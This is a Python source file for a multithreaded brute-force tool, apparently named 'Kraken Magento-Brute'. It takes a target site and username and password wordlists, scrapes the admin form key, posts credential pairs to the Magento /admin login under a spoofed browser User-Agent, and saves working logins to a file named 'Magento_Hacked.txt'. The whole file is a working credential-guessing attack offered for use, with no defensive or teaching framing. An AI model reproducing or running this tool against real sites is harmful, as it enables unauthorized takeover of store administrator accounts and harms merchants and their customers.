import os
import sys
import time
import re
import requests
import logging
from colorama import Fore, Style, init
from random import choice
import pyfiglet
from threading import Thread, Lock
from queue import Queue


init(autoreset=True)


logging.basicConfig(filename=os.path.join('Logs', 'magento_brute_debug.log'),
                    level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')


script_dir = os.path.dirname(os.path.realpath(__file__))
results_dir = os.path.join(script_dir, 'Results')
logs_dir = os.path.join(script_dir, 'Logs')
wordlists_dir = os.path.join(script_dir, "..", "wordlists")


os.makedirs(results_dir, exist_ok=True)
os.makedirs(logs_dir, exist_ok=True)


output_lock = Lock()

def clear_console():
    """Clears the console window."""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    """Displays the script banner with random color."""
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    banner_color = choice(colors)
    banner = pyfiglet.figlet_format("Kraken Magento-Brute", font="slant")
    print(Style.BRIGHT + banner_color + banner)
    print(Style.RESET_ALL + Fore.WHITE + "="*80 + "\n")

def status(msg):
    """Prints status messages."""
    with output_lock:
        print(Fore.CYAN + "[*] " + msg)
        logging.debug(msg)

def success(msg):
    """Prints success messages."""
    with output_lock:
        print(Fore.GREEN + "[+] " + msg)
        logging.info(msg)

def error(msg):
    """Prints error messages."""
    with output_lock:
        print(Fore.RED + "[-] " + msg)
        logging.error(msg)

class MagentoBruteForce:
    def __init__(self):
        clear_console()
        display_banner()

        self.site, self.usernames, self.passwords, self.num_threads = self.get_user_input()
        self.queue = Queue()
        self.threads = []
        self.total_attempts = len(self.usernames) * len(self.passwords)
        self.attempt_number = 0

        
        for username in self.usernames:
            for password in self.passwords:
                self.queue.put((username, password))

        
        for _ in range(self.num_threads):
            t = Thread(target=self.worker)
            t.start()
            self.threads.append(t)

        
        self.queue.join()
        print("\n")
        success("[Completed] All password attempts finished.")

    def get_user_input(self):
        """Gathers user input for the Magento brute force operation."""
        site = input(Fore.WHITE + '[i] Enter the target: ').strip()
        if not site.startswith(('http://', 'https://')):
            site = 'http://' + site
        site = site.rstrip('/')

        logging.debug(f"Target site: {site}")

        use_username_list = input(Fore.WHITE + "[i] Use username list? (Y/n): ").strip().lower()
        if use_username_list != 'n':
            user_file = input(Fore.WHITE + "[i] Username list (default: users.txt, press Enter for default): ").strip() or os.path.join(wordlists_dir, "users.txt")
            status(f"Loading usernames from {user_file}...")
            logging.debug(f"Loading usernames from {user_file}")
            if not os.path.isfile(user_file):
                error(f"Username list not found: {user_file}")
                sys.exit(1)
            with open(user_file, 'r', encoding='utf-8') as f:
                usernames = [line.strip() for line in f if line.strip()]
            if not usernames:
                error("No usernames found in the list.")
                sys.exit(1)
            success(f"{len(usernames)} usernames loaded from the list.")
            logging.debug(f"Usernames loaded: {usernames}")
        else:
            username = input(Fore.WHITE + "[i] Enter username: ").strip()
            if not username:
                error("No username provided.")
                sys.exit(1)
            usernames = [username]
            success(f"Username entered manually: {username}")
            logging.debug(f"Username entered: {username}")

        passwordlist = input(Fore.WHITE + "[i] Password list (default: passwords.txt, press Enter for default): ").strip() or os.path.join(wordlists_dir, "passwords.txt")
        status(f"Loading passwords from {passwordlist}...")
        logging.debug(f"Loading passwords from {passwordlist}")
        if not os.path.isfile(passwordlist):
            error(f"Password list not found: {passwordlist}")
            sys.exit(1)
        with open(passwordlist, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
        success(f"{len(passwords)} passwords loaded.")
        logging.debug(f"Passwords loaded: {passwords}")

        num_threads = int(input(Fore.WHITE + "[i] Enter number of threads to use (default: 10, press Enter for default): ") or 10)
        logging.debug(f"Number of threads: {num_threads}")

        status("All inputs received successfully.")
        print(Fore.YELLOW + "-"*60)
        print(Fore.YELLOW + Style.BRIGHT + "Starting brute-force attack...")
        return site, usernames, passwords, num_threads

    def worker(self):
        """Thread worker function to process the queue."""
        while not self.queue.empty():
            username, password = self.queue.get()
            self.magento(username, password)
            self.queue.task_done()

    def magento(self, username, password):
        """Attempts to log in to the Magento site using provided credentials."""
        try:
            sess = requests.session()
            logging.debug(f"Attempting to retrieve login page for session: {username}:{password}")
            login_page = sess.get(f'{self.site}/admin', timeout=15)
            logging.debug(f"Login page retrieved: {login_page.status_code}")
            initial_length = len(login_page.content)
            cookies = sess.cookies.get_dict()
            logging.debug(f"Cookies retrieved: {cookies}")

            form_key_match = re.search(r'var FORM_KEY = \'(.*?)\'', login_page.text)
            if not form_key_match:
                error(f"Failed to retrieve form_key from {self.site}")
                logging.error(f"Failed to retrieve form_key from {self.site}")
                return
            form_key = form_key_match.group(1)
            logging.debug(f"Form key retrieved: {form_key}")
        except Exception as e:
            error(f"Failed to retrieve form_key: {e}")
            logging.error(f"Failed to retrieve form_key: {e}")
            return

        post_data = {
            'login[username]': username,
            'login[password]': password,
            'form_key': form_key,
        }
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': f'{self.site}/admin',
        }
        url = f"{self.site}/admin"
        self.attempt_number += 1  

        start_time = time.time()
        try:
            logging.debug(f"Submitting login for {username}:{password}")
            response = sess.post(url, data=post_data, headers=headers, cookies=cookies, allow_redirects=True, timeout=15)
            elapsed_time = time.time() - start_time
            percentage = (self.attempt_number / self.total_attempts) * 100
            estimated_total_time = elapsed_time / (self.attempt_number / self.total_attempts)
            remaining_time = estimated_total_time - elapsed_time
            time_remaining_str = time.strftime('%H:%M:%S', time.gmtime(remaining_time))

            logging.debug(f"Attempt {self.attempt_number}: Status Code: {response.status_code}")
            logging.debug(f"Response Headers: {response.headers}")
            logging.debug(f"Response Body (partial): {response.text[:200]}...")

            
            if 'Invalid login or password' in response.text or 'You did not sign in correctly' in response.text:
                with output_lock:
                    sys.stdout.write(f'\r[{self.attempt_number}/{self.total_attempts}] Tested - {percentage:.2f}% | Estimated Remaining Time: {time_remaining_str} | Current: {username}:{password}')
                    sys.stdout.flush()
            elif 'dashboard' in response.text or len(response.content) > initial_length + 200:
                success_msg = (
                    f"\n[{self.attempt_number}/{self.total_attempts}] Tested - {percentage:.2f}% | Estimated Remaining Time: {time_remaining_str} |"
                    f" Current: {username}:{password}\n"
                    f"\n{Fore.GREEN + Style.BRIGHT}SUCCESS!{Style.RESET_ALL} Valid credentials found!\n"
                    f"{Fore.YELLOW}{'-'*40}\nUsername: {username}\nPassword: {password}\n{'-'*40}\n"
                )
                with output_lock:
                    sys.stdout.write('\033[K')  
                    print(success_msg)
                with open(os.path.join(results_dir, 'Magento_Hacked.txt'), 'a') as writer:
                    writer.write(success_msg)
                logging.info(f"Valid credentials found: {username}:{password}")
                return
            else:
                with output_lock:
                    sys.stdout.write(f'\r[{self.attempt_number}/{self.total_attempts}] Tested - {percentage:.2f}% | Estimated Remaining Time: {time_remaining_str} | Current: {username}:{password}')
                    sys.stdout.flush()
        except Exception as e:
            logging.error(f"Login attempt error: {str(e)}")

def main():
    MagentoBruteForce()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        logging.info("Script interrupted by user.")
        print(Fore.YELLOW + "Script interrupted by user.")
